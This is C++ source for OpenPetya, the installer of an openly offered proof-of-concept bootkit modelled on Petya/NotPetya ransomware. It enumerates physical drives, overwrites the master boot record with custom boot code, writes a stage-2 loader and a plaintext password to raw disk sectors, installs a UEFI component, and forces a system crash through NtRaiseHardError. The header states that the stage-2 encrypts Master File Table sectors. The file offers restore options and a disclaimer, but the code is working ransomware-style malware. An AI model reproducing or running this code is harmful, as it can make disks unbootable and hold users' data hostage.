// OpenPetya.cpp
// Author: iss4cf0ng/ISSAC
// GitHub: https://github.com/iss4cf0ng/OpenPetya/
/*
Introduction:
    OpenPetya is a Proof-of-Concept (PoC) bootkit inspired by Petya/NotPetya ransomware.

Disclaimer:
    Please do NOT use this program for any illegal purposes.

Components:
    1. OpenPetya.exe — User-Interface of OpenPetya
    2. mbr.bin — Custom Master Boot Record, written in assembly language
    3. stage2.bin — Stage2 program which contains core functionalities, including Salsa20 cryptographic algorithm, written in C

What it CAN do:
    1. Encrypt 256 sectors of Master File Table (MFT)
    2. Trigger BSOD via NtRaiseHardError

What is CAN'T do:
    1. Worming
    2. C2 communication

*/

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <setupapi.h>
#include <devguid.h>
#include <fstream>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <tchar.h>

#include "petya.h"
#include "utils.h"
#include "uefi.h"

#pragma comment(lib, "setupapi.lib")

// Define prototype of NtRaiseHardError
typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
    NTSTATUS,
    ULONG,
    ULONG,
    PULONG_PTR,
    ULONG,
    PULONG
);

// Define prototype of RtlAdjustPrivilege
typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
    ULONG,
    BOOLEAN,
    BOOLEAN,
    PBOOLEAN
);

struct stDriveInfo
{
    int nIndex;
    UINT64 uSizeBytes;
    std::wstring szModel;
    std::wstring szPath;
};

/// @brief 
/// @return 
std::vector<stDriveInfo> fnListDrives()
{
    std::vector<stDriveInfo> lsDrives;

    for (int i = 0; i < 16; i++)
    {
        std::wstring szPath = L"\\\\.\\PhysicalDrive" + std::to_wstring(i);
        HANDLE hFile = CreateFileW(
            szPath.c_str(),
            0, // query only, no read/write
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );

        if (INVALID_HANDLE_VALUE == hFile)
            continue;

        stDriveInfo info;
        info.nIndex = i;
        info.szPath = szPath;

        // Get disk size
        DISK_GEOMETRY_EX geo = {};
        DWORD ret = 0;
        if (DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr))
        {
            info.uSizeBytes = (UINT64)geo.DiskSize.QuadPart;
        }

        STORAGE_PROPERTY_QUERY query = {};
        query.PropertyId = StorageDeviceProperty;
        query.QueryType = PropertyStandardQuery;

        uint8_t abDescriptor[512] = {};
        if (DeviceIoControl(hFile, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), abDescriptor, sizeof(abDescriptor), &ret, nullptr))
        {
            auto *descriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(abDescriptor);
            if (descriptor->ProductIdOffset)
            {
                const char *szModel = reinterpret_cast<const char*>(abDescriptor) + descriptor->ProductIdOffset;
                int nLength = MultiByteToWideChar(CP_ACP, 0, szModel, -1, nullptr, 0);
                if (nLength > 0)
                {
                    std::wstring s(nLength, 0);
                    MultiByteToWideChar(CP_ACP, 0, szModel, -1, &s[0], nLength);
                    while (!s.empty() && (s.back() == L' ' || s.back() == L'\0'))
                        s.pop_back();

                    info.szModel = s;
                }
            }
        }

        if (info.szModel.empty())
            info.szModel = L"(Unknown model)";

        lsDrives.push_back(info);

        CloseHandle(hFile);
    }

    return lsDrives;
}

/// @brief Print all drives
/// @param lsDrives 
void fnPrintDrives(const std::vector<stDriveInfo>& lsDrives)
{
    std::wcout << "\nAvailable physical drives:\n";
    std::wcout << std::left << std::setw(6) << L"#" << std::setw(12) << "Size" <<  L"Mode\n";
    std::wcout  << L"------------------------------------------\n";

    for (const auto& drive : lsDrives)
    {
        double gb = static_cast<double>(drive.uSizeBytes) / (1024 * 1024 * 1024);
        std::wstringstream ss;
        ss << std::fixed << std::setprecision(1) << gb << L" GB";
        std::wcout << std::left << std::setw(6) << (L"[" + std::to_wstring(drive.nIndex) + L"]") << std::setw(12) << ss.str() << drive.szModel << L'\n';
    }
}

/// @brief Read specified file
/// @param szPath File path
/// @param abBuffer return file buffer
/// @return 
bool fnbReadFile(const std::string& szPath, std::vector<uint8_t>& abBuffer)
{
    std::ifstream fs(szPath, std::ios::binary | std::ios::ate);
    if (!fs)
    {
        std::cerr << "\tCannot open file: " << szPath << "\n";
        return false;
    }

    size_t nSize = (size_t)fs.tellg();
    fs.seekg(0);
    abBuffer.resize(nSize);

    if (!fs.read(reinterpret_cast<char*>(abBuffer.data()), nSize))
    {
        std::cerr << "\tRead error: " << szPath << "\n";
        return false;
    }

    return true;
}

/// @brief 
/// @param abBuffer 
void fnPadToSector(std::vector<uint8_t>& abBuffer)
{
    size_t rem = abBuffer.size() % SECTOR_SIZE;
    if (rem != 0)
        abBuffer.resize(abBuffer.size() + SECTOR_SIZE - rem, 0);
}

/// @brief Validate file
/// @param abMBR 
/// @return 
bool fnbValidateMBR(const std::vector<uint8_t>& abMBR)
{
    if (abMBR.size() < SECTOR_SIZE)
        return false;

    return abMBR[510] == 0x55 && abMBR[511] == 0xAA;
}

/// @brief 
/// @param szDrivePath 
/// @param szOutPath 
/// @return 
bool fnbBackupMBR(const std::wstring& szDrivePath, const std::string& szOutPath)
{
    std::wcout << L"\n[Backup MBR] Reading sector 0...\n";
    
    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, false))
        return false;

    std::vector<uint8_t> abMBR;
    if (!disk.fnbReadSectors(0, 1, abMBR))
        return false;

    std::cout   << "Boot signature: "
                << std::hex << (int)abMBR[510] << " " << (int)abMBR[511]
                << std::dec << "\n";

    std::cout   << "Partition table (0x1BE):\n";
    for (int i = 0; i < 4; i++)
    {
        uint8_t* e = abMBR.data() + 0x1BE + i * 16;
        uint8_t type = e[4];
        uint32_t lba = *(uint32_t *)(e + 8);
        uint32_t sector = *(uint32_t *)(e + 12);

        if (type == 0)
            continue;

        std::cout << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;

        if (type == 0x07)
            std::cout << " (NTFS)";
        if (type == 0x0B || type == 0x0C)
            std::cout << " (FAT32)";
        if (type == 0x05 || type == 0x0F)
            std::cout << " (Extended)";
        if (type == 0x83)
            std::cout << " (Linux)";

        std::cout << "\n";
    }

    // Write to file
    std::ofstream fs(szOutPath, std::ios::binary);
    if (!fs)
    {
        std::cerr << "Cannot create backup file: " << szOutPath << "\n";
        return false;
    }

    fs.write(reinterpret_cast<char*>(abMBR.data()), abMBR.size());
    std::cout << "Saved to: " << szOutPath << "\n";

    return true;
}

/// @brief 
/// @param szDrivePath 
/// @return 
bool fnbSaveChainloadBackup(const std::wstring& szDrivePath)
{
    std::cout << "\n[Chainload backup] Saving original MBR to sector " << BACKUP_MBR_SECTOR << "...\n";

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    // Read sector 0
    std::vector<uint8_t> abMBR;
    if (!disk.fnbReadSectors(0, 1, abMBR))
        return false;

    if (!fnbValidateMBR(abMBR))
    {
        std::cerr << "Warning: no 0x55AA signature in sector 0\n";
    }

    // Write original MBR to sector 63
    if (!disk.fnbWriteSectors(BACKUP_MBR_SECTOR, abMBR))
        return false;

    std::cout << "Original MBR is successfully saved to sector " << BACKUP_MBR_SECTOR << "\n";
    
    return true;
}

/// @brief 
/// @param szDrivePath 
/// @param szMbrPath 
/// @return 
bool fnbWriteMBR(const std::wstring& szDrivePath, const std::string& szMbrPath)
{
    std::cout << "\n[Write MBR] Installing custom boot code...\n";

    // Read custom MBR binary file
    std::vector<uint8_t> abMBR;
    if (!fnbReadFile(szMbrPath, abMBR))
        return false;

    if (!fnbValidateMBR(abMBR))
    {
        std::cerr << "Error: " << szMbrPath << " has no 0x55 signature!\n";
        return false;
    }

    std::cout << "Custom MBR: " << szMbrPath << "(" << abMBR.size() << ")\n";

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    // Read current MBR from disk because we need the partition table
    std::vector<uint8_t> abDiskMBR;
    if (!disk.fnbReadSectors(0, 1, abDiskMBR))
        return false;

    // Merge the custom boot code (446 bytes) + disk's partition table (64 bytes) + 0x55AA
    std::vector<uint8_t> abMerged(SECTOR_SIZE);

    // Copy the boot code (byte 0 to 445)
    memcpy(abMerged.data(), abMBR.data(), MBR_BOOT_CODE_SIZE);

    // Keep original partition table (bytes 446-509)
    memcpy(abMerged.data() + 0x1BE, abDiskMBR.data() + 0x1BE, 64);

    // Boot signature (byte 510-511)
    abMerged[510] = 0x55;
    abMerged[511] = 0xAA;

    // Overwrite
    if (!disk.fnbWriteSectors(0, abMerged))
        return false;

    std::cout << "Boot code is written (446 bytes), partition table is preserved.\n";
    std::cout << "Boot signature: 0x55 0xAA\n";

    return true;
}

/// @brief 
/// @param szDrivePath 
/// @param szStage2Path 
/// @return 
bool fnbWriteStage2(const std::wstring& szDrivePath, const std::string& szStage2Path)
{
    std::cout << "\n[Write Stage2] Installing Stage2 bootloader...\n";

    std::vector<uint8_t> abStage2;
    if (!fnbReadFile(szStage2Path, abStage2))
        return false;

    fnPadToSector(abStage2);

    DWORD sectors = (DWORD)(abStage2.size() / SECTOR_SIZE);
    
    printf("Stage2: %s (%d bytes, sectors %d)\n", szStage2Path, abStage2.size(), sectors);
    printf("Writing to sectors %d-%d...\n", STAGE2_START_SECTOR, STAGE2_START_SECTOR + sectors + 1);

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    if (!disk.fnbWriteSectors(STAGE2_START_SECTOR, abStage2))
        return false;

    std::cout << "Stage2 is successfulyl written.\n";

    return true;
}

/// @brief Restore MBR from disk
/// @param szDrivePath 
/// @param szBackupFile 
/// @return 
bool fnbRestoreMBR(const std::wstring& szDrivePath, const std::string& szBackupFile)
{
    std::cout << "\n[Restore MBR] Restoring original MBR...\n";
    std::vector<uint8_t> abBackup;

    if (!fnbReadFile(szBackupFile, abBackup))
    {
        std::cerr << "\nRead backup file failed!\n";
        return false;
    }

    if (abBackup.size() < SECTOR_SIZE)
    {
        std::cerr << "\tBackup file too small!\n";
        return false;
    }

    if (!fnbValidateMBR(abBackup))
    {
        std::cerr << "\tWarning: backup has no 0x55AA signature.\n";
    }

    fnPadToSector(abBackup);
    abBackup.resize(SECTOR_SIZE);

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    if (!disk.fnbWriteSectors(0, abBackup))
        return false;

    std::cout << "\tOriginal MBR is restored successfully.\n";

    return true;
}

/// @brief 
/// @param szDrivePath 
/// @return 
bool fnbValidate(const std::wstring& szDrivePath)
{
    std::cout << "\n[Validate] Reading disk...\n";

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, false))
        return false;

    std::vector<uint8_t> abMBR;
    if (!disk.fnbReadSectors(0, 1, abMBR))
        return false;

    std::cout << "\n\tMBR (sector 0) first 64 bytes:\n";
    fnHexdump(abMBR.data(), 64, 0);

    std::cout << "\n\tBoot sigature: 0x" << std::hex << (int)abMBR[510] << " 0x" << (int)abMBR[511] << std::dec;
    if (abMBR[510] == 0x55 && abMBR[511] == 0xAA)
        std::cout << " (valid)\n";
    else
        std::cout << " (INVALID)\n";

    std::cout << "\n\tPartition table:\n";
    for (int i = 0; i < 4; i++)
    {
        uint8_t *e = abMBR.data() + 0x1BE + i * 16;
        uint8_t type = e[4];
        uint32_t lba = *(uint32_t *)(e + 8);
        uint32_t sector = *(uint32_t *)(e + 12);

        if (type == 0)
            continue;

        std::cout   << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;

        if (type == 0x07)
            std::cout << " (NTFS)";
        if (type == 0x08 || type == 0x0C)
            std::cout << " (FAT32)";

        std::cout << "\n";
    }

    // Check sector 63 (chainload backup)
    std::vector<uint8_t> abBackup;
    if (disk.fnbReadSectors(BACKUP_MBR_SECTOR, 1, abBackup))
        std::cout << "\n\tSector " << BACKUP_MBR_SECTOR << " (chainload backup) signature: 0x" << std::hex << (int)abBackup[510] << "0x" << (int)abBackup[511] << std::dec << "\n";

    return true;
}

/// @brief 
/// @param szMsg 
/// @return 
bool fnbConfirm(const std::string& szMsg)
{
    std::cout << "\n" << szMsg << " (yes/no): ";
    std::string szAns;
    std::getline(std::cin, szAns);

    return szAns == "yes" || szAns == "YES" || szAns == "y";
}

/// @brief 
/// @param szDrivePath 
/// @return 
UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
{
    HANDLE hFile = CreateFileW(
        szDrivePath.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if (INVALID_HANDLE_VALUE == hFile)
        return 0;

    DISK_GEOMETRY_EX geo = {};
    DWORD ret = 0;
    DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
    CloseHandle(hFile);

    return (UINT64)geo.DiskSize.QuadPart / 512;
}

/// @brief 
/// @param szDrivePath 
/// @param nTotalSectors 
/// @return 
bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
{
    std::cout << "\n[Write disk size] Sectors: " << nTotalSectors << "\n";

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    std::vector<uint8_t> abStateSector(SECTOR_SIZE, 0);

    uint32_t magic = 0x424F4F54UL;
    memcpy(abStateSector.data(), &magic, 4);
    abStateSector[4] = 0x00;
    memcpy(abStateSector.data() + 8, &nTotalSectors, 8);

    if (!disk.fnbWriteSectors(60, abStateSector))
        return false;

    // Verify
    std::vector<uint8_t> abCheck;
    if (!disk.fnbReadSectors(60, 1, abCheck))
        return false;

    uint32_t read_magic = *(uint32_t *)(abCheck.data() + 0);
    uint64_t read_size  = *(uint64_t *)(abCheck.data() + 8);

    printf("\tVerify: magic=0x%08X state=0x%02X disk_sectors=%llu\n", read_magic, abCheck[4], read_size);

    if (read_magic != 0x424F4F54UL || read_size != nTotalSectors)
    {
        std::cerr << "\tERROR: State sector verify FAILED!\n";
        return false;
    }

    std::cout << "\tState sector OK.\n";
    return true;
}

/// @brief 
/// @param szPrompt 
/// @return 
std::string fnInputPassword(const std::string& szPrompt)
{
    std::cout << szPrompt;

    std::string szPass;
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);

    // Disable echo
    SetConsoleMode(hStdin, mode & ~ENABLE_ECHO_INPUT);

    char ch;
    DWORD read = 0;
    while (ReadConsoleA(hStdin, &ch, 1, &read, nullptr))
    {
        if (ch == '\r')
        {
            // consume '\n'
            ReadConsoleA(hStdin, &ch, 1, &read, nullptr);
            break;
        }

        if (ch == '\b' && !szPass.empty())
        {
            szPass.pop_back();
            std::cout << "\b \b";
        }
        else if (ch != '\b')
        {
            szPass += ch;
            std::cout << '*';
        }
    }

    // Restore echo
    SetConsoleMode(hStdin, mode);
    std::cout << "\n";

    return szPass;
}

/// @brief Write password plain text into disk, this password will be erased during the encryption stage
/// @param szDrivePath 
/// @param szPassword 
/// @return 
bool fnbWritePassword(const std::wstring& szDrivePath, const std::string& szPassword)
{
    std::cout << "\n[Write password] Storing to sector 59...\n";

    if (szPassword.empty())
    {
        std::cerr << "\tError: password cannot be empty.\n";
        return false;
    }

    if (szPassword.size() > 64)
    {
        std::cerr << "\tError: password is too long (max 64 chars)\n";
        return false;
    }

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    // Build sector
    std::vector<uint8_t> abSector(SECTOR_SIZE, 0);

    // magic
    uint32_t magic = 0x50415353UL; // "PASS"
    memcpy(abSector.data(), &magic, 4);

    // length
    abSector[4] = (uint8_t)szPassword.size();

    // password bytes
    memcpy(abSector.data() + 5, szPassword.data(), szPassword.size());

    if (!disk.fnbWriteSectors(59, abSector))
        return false;

    std::cout << "\tPassword is written to sector 59.\n";
    std::cout << "\tIt will be erased by bootloader after first boot.\n";

    // Zero password string from memory.
    volatile char *p = (volatile char *)szPassword.data();
    for (size_t i = 0; i < szPassword.size(); i++)
        p[i] = 0;

    return true;
}

/// @brief Clear metadata (sectors 59-63)
/// @param szDrivePath 
/// @return 
bool fnbClearMetadata(const std::wstring& szDrivePath)
{
    std::cout << "\n[Clear metadata] Wiping sectors 59-63...\n";

    clsDiskHandle disk;
    if (!disk.fnbOpen(szDrivePath, true))
        return false;

    std::vector<uint8_t> abZero(SECTOR_SIZE, 0);
    for (int s = 59; s < 64; s++)
    {
        if (!disk.fnbWriteSectors(s, abZero))
        {
            return false;
        }
    }

    std::cout << "\tDone.\n";

    return true;
}

void fnPrintBanner()
{
    std::cout << R"(
       ___     _ __                     ___            _       _  _          
      / _ \   | '_ \   ___    _ _      | _ \   ___    | |_    | || |  __ _   
     | (_) |  | .__/  / -_)  | ' \     |  _/  / -_)   |  _|    \_, | / _` |  
      \___/   |_|__   \___|  |_||_|   _|_|_   \___|   _\__|   _|__/  \__,_|  
    _|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_| """"|_|"""""| 
    "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
        )" << std::endl;

    std::cout << "OpenPetya v1.0.0" << std::endl;
    std::cout << "Author: iss4cf0ng/ISSAC" << std::endl;
    std::cout << "GitHub: https://github.com/iss4cf0ng/OpenPetya/" << std::endl;
}

/// @brief Print usage
/// @param szProg Application name (File name)
void fnPrintUsage(const char* szProg)
{
    fnPrintBanner();

    std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
                << "Options:\n"
                << "Legacy BIOS:\n"
                << "\t--install <mbr.bin> <stage.bin>   Full installation\n"
                << "\t--backup-mbr <file>               Backup MBR to specified output file\n"
                << "\t--save-chainload                  Save MBR to sector 63\n"
                << "\t--write-mbr                       Write MBR boot code\n"
                << "\t--write-stage2                    Write Stage2\n"
                << "\t--restore-mbr                     Restore original MBR\n"
                
                << "\nUEFI:\n"
                << "\t--uefi-install                    Install custom UEFI program\n"
                << "\t--uefi-restore                    Restore original UEFI program\n"

                << "\nTools:\n"
                << "\t--validate                        Show disk state\n"
                << "\t--bsod                            Raise BSOD via NtRaiseHardError()"
                << "\t--list                            List physical drives\n"
                << "\t--drive N                         Select PhysicalDriveN\n"

                << "\nExamples:\n"
                << "\tOpenPetya.exe --list\n"
                << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
                << "\tOpenPetya.exe --drive 1 --install mbr.bin stage2.bin\n"
                << "\tOpenPetya.exe --drive 1 --restore-mbr original_mbr.bin\n"
                << "\tOpenPetya.exe --drive 1 --validate\n\n";
}

int _tmain(int argc, char *argv[])
{
    if (argc < 2)
    {
        fnPrintUsage(argv[0]);
        return 1;
    }

    int nIdxDrive = -1;
    bool bList = false;

    // Legacy
    bool bBackup = false;
    bool bChainload = false;
    bool bWriteMBR = false;
    bool bWriteStage2 = false;
    bool bRestore = false;
    bool bValidate = false;
    bool bInstall = false;

    // UEFI
    bool bUefiInstall = false;
    bool bUefiRestore = false;
    std::wstring szMyEfiPath;

    std::string szBackupPath;
    std::string szMbrPath;
    std::string szStage2Path;
    std::string szRestorePath;

    OSVERSIONINFOEX osvi = {};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    GetVersionEx((OSVERSIONINFO *)&osvi);
    int nMajor = osvi.dwMajorVersion;
    int nMinor = osvi.dwMinorVersion;

    for (int i = 1; i < argc; i++)
    {
        std::string arg = argv[i];

        if (arg == "--h" || arg == "--help")
        {
            fnPrintUsage(argv[0]);
            return 0;
        }
        if (arg == "--list")
        {
            bList = true;
        }
        else if (arg == "--drive" && i + 1 < argc)
        {
            nIdxDrive = std::stoi(argv[++i]);
        }
        else if (arg == "--backup-mbr" && i + 1 < argc)
        {
            bBackup = true;
            szBackupPath = argv[++i];
        }
        else if (arg == "--save-chainload")
        {
            bChainload = true;
        }
        else if (arg == "--write-mbr" && i + 1 < argc)
        {
            bWriteMBR = true;
            szMbrPath = argv[++i];
        }
        else if (arg == "--write-stage2" && i + 1 < argc)
        {
            bWriteStage2 = true;
            szStage2Path = argv[++i];
        }
        else if (arg == "--restore-mbr" && i + 1 < argc)
        {
            bRestore = true;
            szRestorePath = argv[++i];
        }
        else if (arg == "--validate")
        {
            bValidate = true;
        }
        else if (arg == "--install" && i + 2 < argc)
        {
            bInstall = true;
            szMbrPath = argv[++i];
            szStage2Path = argv[++i];
        }
        else if (arg == "--bsod")
        {
            printf("Continue? (yes/no): ");
            std::string szAns;
            std::getline(std::cin, szAns);

            if (szAns != "yes" && szAns != "y")
            {
                printf("Cancelled.\n");
                return 0;
            }

            // Hell Yeahhhhhhh!
            HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
            auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
            auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

            if (!RtlAdjustPrivilege)
            {
                std::cout << "Failed to get export address of NtlAdjustPrivilege!" << std::endl;
                return 1;
            }

            if (!NtRaiseHardError)
            {
                std::cout << "Failed to get export address of NtRaiseHardError!" << std::endl;
                return 1;
            }

            ULONG response = 0;
            BOOLEAN enabled;
            NTSTATUS status;

            status = RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
            if (status != 0)
            {
                std::cout << "RtlAdjustPrivilege failed: 0x" << std::hex << status << std::endl;
                return 1;
            }

            status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);

            std::cout << "Status: " << std::hex << status << std::endl;
        }
        else if (arg == "--uefi-install" && i + 1 < argc)
        {
            bUefiInstall = true;
            std::string s = argv[++i];
            szMyEfiPath = std::wstring(s.begin(), s.end());
        }
        else if (arg == "--uefi-restore")
        {
            bUefiRestore = true;
        }
        else
        {
            std::cerr << "Unknown option: " << arg << std::endl;
            fnPrintUsage(argv[0]);

            return 1;
        }
    }

    // List drives (no specified drive need)
    if (bList)
    {
        auto drives = fnListDrives();
        if (drives.empty())
        {
            std::wcout << L" No drives found (need Administrator?)\n";
            return 1;
        }

        fnPrintDrives(drives);

        return 0;
    }

    // All other operations need --drive
    if (nIdxDrive < 0)
    {
        std::wcerr << L"Error: --drive N is required\n";
        fnPrintUsage(argv[0]);

        return 1;
    }

    std::wstring szDrivePath = L"\\\\.\\PhysicalDrive" + std::to_wstring(nIdxDrive);
    std::wcout << L"\nTarget drive: " << szDrivePath << L"\n";

    // --install: full workflow
    bool bRet = true;
    if (bInstall)
    {
        std::cout << "\nFull Install\n";
        std::cout << "\tMBR file: " << szMbrPath << "\n";
        std::cout << "\tStage2 file: " << szStage2Path << "\n";

        UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
        if (nTotalSectors == 0)
        {
            std::cerr << "Cannot get disk size!\n";
            return 1;
        }

        printf("\tDisk: %d sectors (%d MB)\n", nTotalSectors, nTotalSectors / 2048);
        printf("\tHidden backup will be at sector %d\n\n", nTotalSectors - 30);

        std::string szPass1, szPass2;
        while (true)
        {
            szPass1 = fnInputPassword("Set bootloader password: ");
            szPass2 = fnInputPassword("Confirm password: ");

            if (szPass1 == szPass2 && !szPass1.empty())
                break;

            if (szPass1.empty())
                std::cerr << "Error: Password cannot be empty.\n\n";
            else
                std::cerr << "Error: Passwords do not match, try again\n\n";
        }

        std::cout << "Password set.\n";

        printf("\nThis will modify PhysicalDrive%d.\n", nIdxDrive);
        printf("Partition table will be preserved.\n");
        printf("Continue? (yes/no): ");
        std::string szAns;
        std::getline(std::cin, szAns);

        if (szAns != "yes" && szAns != "y")
        {
            printf("Cancelled.\n");

            // Zero password
            for (char& c : szPass1)
                c = 0;
            for (char& c : szPass2)
                c = 0;

            return 0;
        }

        if (!fnbClearMetadata(szDrivePath)) {
            std::cerr << "FAILED: ClearMetadata\n";
            return 1;
        }
        szBackupPath = "original_mbr_" + std::to_string(nIdxDrive) + ".bin";
        if (!fnbBackupMBR(szDrivePath, szBackupPath)) {
            std::cerr << "FAILED: BackupMBR\n";
            return 1;
        }
        if (!fnbSaveChainloadBackup(szDrivePath)) {
            std::cerr << "FAILED: SaveChainload\n";
            return 1;
        }
        if (!fnbWriteMBR(szDrivePath, szMbrPath)) {
            std::cerr << "FAILED: WriteMBR\n";
            return 1;
        }
        if (!fnbWriteStage2(szDrivePath, szStage2Path)) {
            std::cerr << "FAILED: WriteStage2\n";
            return 1;
        }
        if (!fnbWriteDiskSize(szDrivePath, nTotalSectors)) {
            std::cerr << "FAILED: WriteDiskSize\n";
            return 1;
        }
        if (!fnbWritePassword(szDrivePath, szPass1)) {
            std::cerr << "FAILED: WritePassword\n";
            return 1;
        }

        for (char& c: szPass1)
            c = 0;
        for (char& c: szPass2)
            c = 0;

        // Validation
        if (bRet)
            fnbValidate(szDrivePath);

        std::cout << "Installation is " << (bRet ? "completed!" : "FAILED!") << "\n";

        if (bRet)
        {
            std::cout << "\nBackup is saved to: " << szBackupPath << "\n";
            std::cout << "To restore: OpenPetya.exe --drive " << nIdxDrive << " --restore-mbr " << szBackupPath << "\n";
        }

        return (int)bRet;
    }

    if (bUefiInstall)
    {
        UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
        if (!nTotalSectors)
        {
            fprintf(stderr, "[-] Cannot get disk size!\n");
            return 1;
        }

        std::string szPassword1, szPassword2;
        while (true)
        {
            szPassword1 = fnInputPassword("Set password: ");
            szPassword2 = fnInputPassword("Confirm: ");

            if (!szPassword1.empty() && szPassword1 == szPassword2)
                break;

            fprintf(stderr, "[!] " + szPassword1.empty() ? "Empty!\n" : "Mismatch!\n");
        }

        bool bResult = fnbInstallUEFI(szMyEfiPath, szPassword1, szDrivePath, nTotalSectors);

        for (char &c : szPassword1)
            c = 0;
        for (char &c : szPassword2)
            c = 0;

        return bResult ? 0 : 1;
    }

    if (bUefiRestore)
        return fnbRestoreUEFI() ? 0 : 1;

    // Individual operations
    if (bBackup)
        bRet = bRet && fnbBackupMBR(szDrivePath, szBackupPath);

    if (bChainload)
        bRet = bRet && fnbSaveChainloadBackup(szDrivePath);

    if (bWriteMBR)
        bRet = bRet && fnbWriteMBR(szDrivePath, szMbrPath);

    if (bWriteStage2)
        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);

    if (bRestore)
        bRet = bRet && fnbRestoreMBR(szDrivePath, szRestorePath);

    if (bValidate)
        bRet = bRet && fnbValidate(szDrivePath);

    return (int)bRet;
}